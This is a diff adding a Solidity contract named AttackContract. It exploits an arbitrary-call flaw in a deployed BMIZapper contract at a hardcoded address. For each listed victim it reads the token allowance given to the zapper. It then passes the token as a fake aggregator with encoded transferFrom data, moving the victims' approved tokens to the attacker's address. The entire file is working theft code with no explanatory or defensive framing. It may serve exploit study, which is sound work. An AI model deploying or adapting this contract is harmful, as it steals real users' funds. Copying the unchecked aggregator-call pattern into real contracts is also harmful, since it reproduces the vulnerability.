@@ -1,0 +1,66 @@
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
+interface IBMIZapper {
+    function zapToBMI(
+        address _from,
+        uint256 _amount,
+        address _fromUnderlying,
+        uint256 _fromUnderlyingAmount,
+        uint256 _minBMIRecv,
+        address[] calldata _bmiConstituents,
+        uint256[] calldata _bmiConstituentsWeightings,
+        address _aggregator,
+        bytes calldata _aggregatorData,
+        bool refundDust
+    ) external returns (uint256);
+}
+
+
+contract AttackContract{
+    address BMIZapperAddress = 0x4622aFF8E521A444C9301dA0efD05f6b482221b8;
+    address BUSD = 0x4Fabb145d64652a948d72533023f6E7A623C7C53;
+    function start(address[] calldata tokens, address[] calldata victims) external{
+        for(uint i = 0; i<victims.length;i++){
+            address tokenToSteal = tokens[i];
+            uint256 amountToSteal;
+
+            uint256 balanceOfVictim = IERC20(tokenToSteal).balanceOf(victims[i]);
+            uint256 allowanceGivenByVictim = IERC20(tokenToSteal).allowance(victims[i],BMIZapperAddress);
+            if(balanceOfVictim>allowanceGivenByVictim){
+                amountToSteal = allowanceGivenByVictim;
+            }
+            else{
+                amountToSteal = balanceOfVictim;
+            }
+            address[] memory bmiConstituents = new address[](0);
+            uint256[] memory bmiConstituentsWeightings = new uint256[](1);
+            bmiConstituentsWeightings[0] = 1e18;
+            bytes memory DataParam = abi.encodeWithSignature(
+                "transferFrom(address,address,uint256)",
+                victims[i],
+                tx.origin,
+                amountToSteal
+            );
+
+        IBMIZapper(BMIZapperAddress).zapToBMI(
+            BUSD,
+            0,
+            address(0),
+            0,
+            0,
+            bmiConstituents,
+            bmiConstituentsWeightings,
+            tokenToSteal, // Token that the attacker steals from the victims
+            DataParam, // Fake Aggregator data
+            true 
+        );
+
+        }
+        
+    }
+}
+
+
+
+
+
+
